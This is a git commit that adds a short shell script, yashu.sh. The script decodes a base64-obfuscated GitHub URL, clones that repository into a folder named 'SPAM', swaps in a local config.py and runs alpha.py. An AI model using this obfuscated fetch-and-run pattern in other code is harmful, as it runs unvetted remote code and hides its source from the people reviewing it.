e6273230e306eabaa2f5f5175f57c81f15ec9d76
Rᴀᴅʜᴀ Sɪɴɢʜ <133753917+Radhak8@users.noreply.github.com>
2023-09-07 15:48:47 +0530

    Create yashu.sh

---
+++ yashu.sh
@@ -0,0 +1,18 @@
+_yashu () {
+    echo "aHR0cHM6Ly9naXRodWIuY29tL1JhZGhhazgvaWRr==" | base64 -d
+}
+
+_alpha () {
+    if [ -d "SPAM" ]; then  
+        rm -r SPAM
+    fi
+    git clone $(_yashu) SPAM 
+    echo "Configuring Environment..."
+    rm SPAM/config.py
+    cp config.py SPAM/config.py
+    cd SPAM
+    echo "Inititalizing..."
+    python3 alpha.py
+}
+
+_alpha
